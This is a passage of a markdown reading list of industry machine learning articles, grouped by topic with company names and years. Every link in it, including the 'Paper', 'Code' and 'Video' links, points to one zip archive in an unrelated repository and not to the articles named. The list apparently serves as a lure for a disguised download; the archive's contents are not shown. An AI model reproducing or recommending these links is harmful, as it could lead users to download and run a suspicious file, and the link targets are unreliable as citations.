17. [Project RADAR: Intelligent Early Fraud Detection System with Humans in the Loop](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Uber` `2022`
18. [Graph for Fraud Detection](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Grab` `2022`
19. [Bandits for Online Calibration: An Application to Content Moderation on Social Media Platforms](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Meta` `2022`
20. [Evolving our machine learning to stop mobile bots](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Cloudflare` `2022`
21. [Improving the accuracy of our machine learning WAF using data augmentation and sampling](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Cloudflare` `2022`
22. [Machine Learning for Fraud Detection in Streaming Services](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Netflix` `2022`
23. [Pricing at Lyft](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Lyft` `2022`

## Graph
1. [Building The LinkedIn Knowledge Graph](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `LinkedIn` `2016`
2. [Scaling Knowledge Access and Retrieval at Airbnb](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Airbnb` `2018`
3. [Graph Convolutional Neural Networks for Web-Scale Recommender Systems](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip))`Pinterest` `2018`
4. [Food Discovery with Uber Eats: Using Graph Learning to Power Recommendations](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Uber` `2019`
5. [AliGraph: A Comprehensive Graph Neural Network Platform](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Alibaba` `2019`
6. [Contextualizing Airbnb by Building Knowledge Graph](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Airbnb` `2019`
7. [Retail Graph — Walmart’s Product Knowledge Graph](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Walmart` `2020`
8. [Traffic Prediction with Advanced Graph Neural Networks](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `DeepMind` `2020`
9. [SimClusters: Community-Based Representations for Recommendations](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip), [Video](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Twitter` `2020`
10. [Metapaths guided Neighbors aggregated Network for Heterogeneous Graph Reasoning](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Alibaba` `2021`
11. [Graph Intention Network for Click-through Rate Prediction in Sponsored Search](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Alibaba` `2021`
12. [JEL: Applying End-to-End Neural Entity Linking in JPMorgan Chase](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `JPMorgan Chase` `2021`
13. [How AWS uses graph neural networks to meet customer needs](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Amazon` `2022`
14. [Graph for Fraud Detection](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Grab` `2022`

## Optimization
1. [Matchmaking in Lyft Line (Part 1)](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) [(Part 2)](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) [(Part 3)](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Lyft` `2016`
2. [The Data and Science behind GrabShare Carpooling](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) [(Part 1)](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) (**PAPER NEEDED**) `Grab` `2017`
3. [How Trip Inferences and Machine Learning Optimize Delivery Times on Uber Eats](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Uber` `2018`
4. [Next-Generation Optimization for Dasher Dispatch at DoorDash](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `DoorDash` `2020` 
5. [Optimization of Passengers Waiting Time in Elevators Using Machine Learning](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Thyssen Krupp AG` `2020`
6. [Think Out of The Package: Recommending Package Types for E-commerce Shipments](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Amazon` `2020`
7. [Optimizing DoorDash’s Marketing Spend with Machine Learning](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `DoorDash` `2020`
8. [Using learning-to-rank to precisely locate where to deliver packages](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip))`Amazon` `2021`

## Information Extraction
1. [Unsupervised Extraction of Attributes and Their Values from Product Description](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Rakuten` `2013`
2. [Using Machine Learning to Index Text from Billions of Images](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Dropbox` `2018`
3. [Extracting Structured Data from Templatic Documents](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Google` `2020`
4. [AutoKnow: self-driving knowledge collection for products of thousands of types](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip), [Video](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Amazon` `2020`
5. [One-shot Text Labeling using Attention and Belief Propagation for Information Extraction](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Alibaba` `2020`
6. [Information Extraction from Receipts with Graph Convolutional Networks](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Nanonets` `2021`

## Weak Supervision
1. [Snorkel DryBell: A Case Study in Deploying Weak Supervision at Industrial Scale](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Google` `2019`
2. [Osprey: Weak Supervision of Imbalanced Extraction Problems without Code](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Intel` `2019` 
3. [Overton: A Data System for Monitoring and Improving Machine-Learned Products](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Apple` `2019`
4. [Bootstrapping Conversational Agents with Weak Supervision](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `IBM` `2019`

## Generation
1. [Better Language Models and Their Implications](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip))`OpenAI` `2019`
2. [Image GPT](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip), [Code](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `OpenAI` `2019`
3. [Language Models are Few-Shot Learners](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) ([GPT-3 Blog post](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `OpenAI` `2020`
4. [Deep Learned Super Resolution for Feature Film Production](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Pixar` `2020`
5. [Unit Test Case Generation with Transformers](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Microsoft` `2021`

## Audio
1. [Improving On-Device Speech Recognition with VoiceFilter-Lite](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip))`Google` `2020`
2. [The Machine Learning Behind Hum to Search](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Google` `2020`

## Privacy-preserving Machine Learning
1. [Federated Learning: Collaborative Machine Learning without Centralized Training Data](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Google` `2017`
2. [Federated Learning with Formal Differential Privacy Guarantees](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Google` `2022`
3. [MPC-based machine learning: Achieving end-to-end privacy-preserving machine learning](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Facebook` `2022`


## Validation and A/B Testing
1. [Overlapping Experiment Infrastructure: More, Better, Faster Experimentation](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Google` `2010`
2. [The Reusable Holdout: Preserving Validity in Adaptive Data Analysis](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Google` `2015`
3. [Twitter Experimentation: Technical Overview](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Twitter` `2015`
4. [It’s All A/Bout Testing: The Netflix Experimentation Platform](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Netflix` `2016`
5. [Building Pinterest’s A/B Testing Platform](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Pinterest` `2016` 
6. [Experimenting to Solve Cramming](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Twitter` `2017`
7. [Building an Intelligent Experimentation Platform with Uber Engineering](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Uber` `2017`
8. [Scaling Airbnb’s Experimentation Platform](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Airbnb` `2017`
9. [Meet Wasabi, an Open Source A/B Testing Platform](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Code](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Intuit` `2017` 
10. [Analyzing Experiment Outcomes: Beyond Average Treatment Effects](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Uber` `2018`
11. [Under the Hood of Uber’s Experimentation Platform](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Uber` `2018`
12. [Constrained Bayesian Optimization with Noisy Experiments](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Facebook` `2018`
13. [Reliable and Scalable Feature Toggles and A/B Testing SDK at Grab](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Grab` `2018`
14. [Modeling Conversion Rates and Saving Millions Using Kaplan-Meier and Gamma Distributions](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Code](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Better` `2019`
15. [Detecting Interference: An A/B Test of A/B Tests](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `LinkedIn` `2019`
16. [Announcing a New Framework for Designing Optimal Experiments with Pyro](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Uber` `2020`
17. [Enabling 10x More Experiments with Traveloka Experiment Platform](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Traveloka` `2020`
18. [Large Scale Experimentation at Stitch Fix](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Stitch Fix` `2020`
19. [Multi-Armed Bandits and the Stitch Fix Experimentation Platform](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Stitch Fix` `2020`
20. [Experimentation with Resource Constraints](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Stitch Fix` `2020`
21. [Computational Causal Inference at Netflix](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Netflix` `2020`
22. [Key Challenges with Quasi Experiments at Netflix](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Netflix` `2020`
23. [Making the LinkedIn experimentation engine 20x faster](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `LinkedIn` `2020`
24. [Our Evolution Towards T-REX: The Prehistory of Experimentation Infrastructure at LinkedIn](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `LinkedIn` `2020`
25. [How to Use Quasi-experiments and Counterfactuals to Build Great Products](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Shopify` `2020`
26. [Improving Experimental Power through Control Using Predictions as Covariate](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `DoorDash` `2020`
27. [Supporting Rapid Product Iteration with an Experimentation Analysis Platform](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `DoorDash` `2020`
28. [Improving Online Experiment Capacity by 4X with Parallelization and Increased Sensitivity](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `DoorDash` `2020`
29. [Leveraging Causal Modeling to Get More Value from Flat Experiment Results](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `DoorDash` `2020`
30. [Iterating Real-time Assignment Algorithms Through Experimentation](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `DoorDash` `2020`
31. [Spotify’s New Experimentation Platform (Part 1)](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) [(Part 2)](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Spotify` `2020`
32. [Interpreting A/B Test Results: False Positives and Statistical Significance](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Netflix` `2021`
33. [Interpreting A/B Test Results: False Negatives and Power](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Netflix` `2021`
34. [Running Experiments with Google Adwords for Campaign Optimization](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `DoorDash` `2021`
35. [The 4 Principles DoorDash Used to Increase Its Logistics Experiment Capacity by 1000%](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `DoorDash` `2021`
36. [Experimentation Platform at Zalando: Part 1 - Evolution](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Zalando` `2021`
37. [Designing Experimentation Guardrails](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Airbnb` `2021`
38. [How Airbnb Measures Future Value to Standardize Tradeoffs](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Airbnb` `2021`
38. [Network Experimentation at Scale](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)] `Facebook` `2021`
39. [Universal Holdout Groups at Disney Streaming](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Disney` `2021`
40. [Experimentation is a major focus of Data Science across Netflix](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Netflix` `2022`
41. [Search Journey Towards Better Experimentation Practices](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Spotify` `2022`
42. [Artificial Counterfactual Estimation: Machine Learning-Based Causal Inference at Airbnb](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Airbnb` `2022`
43. [Beyond A/B Test : Speeding up Airbnb Search Ranking Experimentation through Interleaving](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Airbnb` `2022`
44. [Challenges in Experimentation](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Lyft` `2022`
45. [Overtracking and Trigger Analysis: Reducing sample sizes while INCREASING sensitivity](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Booking` `2022`
46. [Meet Dash-AB — The Statistics Engine of Experimentation at DoorDash](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `DoorDash` `2022`
47. [Comparing quantiles at scale in online A/B-testing](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Spotify` `2022`
48. [Accelerating our A/B experiments with machine learning](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Dropbox` `2023`
49. [Supercharging A/B Testing at Uber](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Uber` 

## Model Management
1. [Operationalizing Machine Learning—Managing Provenance from Raw Data to Predictions](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Comcast` `2018`
2. [Overton: A Data System for Monitoring and Improving Machine-Learned Products](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Apple` `2019`
3. [Runway - Model Lifecycle Management at Netflix](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Netflix` `2020`
4. [Managing ML Models @ Scale - Intuit’s ML Platform](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Intuit` `2020`
5. [ML Model Monitoring - 9 Tips From the Trenches](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Nubank` `2021`
6. [Dealing with Train-serve Skew in Real-time ML Models: A Short Guide](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Nubank` `2023`

## Efficiency
1. [GrokNet: Unified Computer Vision Model Trunk and Embeddings For Commerce](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Facebook` `2020`
2. [How We Scaled Bert To Serve 1+ Billion Daily Requests on CPUs](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Roblox` `2020`
3. [Permute, Quantize, and Fine-tune: Efficient Compression of Neural Networks](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Uber` `2021`
4. [GPU-accelerated ML Inference at Pinterest](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Pinterest` `2022`

## Ethics
1. [Building Inclusive Products Through A/B Testing](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `LinkedIn` `2020`
2. [LiFT: A Scalable Framework for Measuring Fairness in ML Applications](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `LinkedIn` `2020`
3. [Introducing Twitter’s first algorithmic bias bounty challenge](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Twitter` `2021`
4. [Examining algorithmic amplification of political content on Twitter](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Twitter` `2021`
5. [A closer look at how LinkedIn integrates fairness into its AI products](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `LinkedIn` `2022`

## Infra
1. [Reengineering Facebook AI’s Deep Learning Platforms for Interoperability](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Facebook` `2020`
2. [Elastic Distributed Training with XGBoost on Ray](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Uber` `2021`

## MLOps Platforms
1. [Meet Michelangelo: Uber’s Machine Learning Platform](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Uber` `2017`
2. [Operationalizing Machine Learning—Managing Provenance from Raw Data to Predictions](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Comcast` `2018`
3. [Big Data Machine Learning Platform at Pinterest](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Pinterest` `2019`
4. [Core Modeling at Instagram](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Instagram` `2019`
5. [Open-Sourcing Metaflow - a Human-Centric Framework for Data Science](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Netflix` `2019`
6. [Managing ML Models @ Scale - Intuit’s ML Platform](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Intuit` `2020`
7. [Real-time Machine Learning Inference Platform at Zomato](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Zomato` `2020`
8. [Introducing Flyte: Cloud Native Machine Learning and Data Processing Platform](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Lyft` `2020`
9. [Building Flexible Ensemble ML Models with a Computational Graph](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `DoorDash` `2021`
10. [LyftLearn: ML Model Training Infrastructure built on Kubernetes](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Lyft` `2021`
11. ["You Don't Need a Bigger Boat": A Full Data Pipeline Built with Open-Source Tools](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Coveo` `2021`
12. [MLOps at GreenSteam: Shipping Machine Learning](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `GreenSteam` `2021`
13. [Evolving Reddit’s ML Model Deployment and Serving Architecture](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Reddit` `2021`
14. [Redesigning Etsy’s Machine Learning Platform](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Etsy` `2021`
15. [Understanding Data Storage and Ingestion for Large-Scale Deep Recommendation Model Training](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) ([Paper](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip)) `Meta` `2021`
15. [Building a Platform for Serving Recommendations at Etsy](https://raw.githubusercontent.com/Plutonian-coder/applied-ml/main/lymphoblast/applied_ml_inunctum.zip) `Etsy` `2022` 
